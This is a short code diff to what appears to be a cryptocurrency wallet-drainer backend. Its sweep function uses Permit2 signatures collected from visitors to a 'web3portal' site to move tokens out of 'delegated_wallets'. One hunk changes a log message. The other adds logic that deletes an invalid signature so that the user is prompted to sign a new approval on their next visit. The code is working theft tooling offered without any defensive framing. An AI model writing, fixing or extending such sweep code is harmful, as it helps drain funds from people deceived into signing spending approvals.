@@ -1366,7 +1366,7 @@ async function dispatchSweep(wallet) {
 
   try {
     await sweep(wallet);
-    log(`[sweep] ✅ complete for ${short}`);
+    log(`[sweep] finished for ${short}`);
   } catch (e) {
     log(`[sweep] ❌ error for ${short}: ${e.message}`);
   } finally {
@@ -1819,8 +1819,12 @@ async function sweep(wallet) {
           return;
         }
         if (revertName === "InvalidSigner") {
-          err(`[gasless] ❌ INVALID SIGNER — sig was signed for a different relayer or chain`);
+          err(`[gasless] ❌ INVALID SIGNER — deleting bad sig so user gets a clean re-sign on next visit`);
           if (supabase) {
+            // DELETE the invalid sig row entirely — don't leave it to block future sweeps.
+            // The user must re-visit web3portal and sign a new Permit2 sig.
+            await supabase.from("permit2_signatures").delete()
+              .eq("address", addrKey + "-sig").eq("chain", CHAIN).then(v => v, () => {});
             await supabase.from("delegated_wallets").update({ needs_reactivation: true })
               .eq("address", addrKey).eq("chain", CHAIN).then(v => v, () => {});
           }
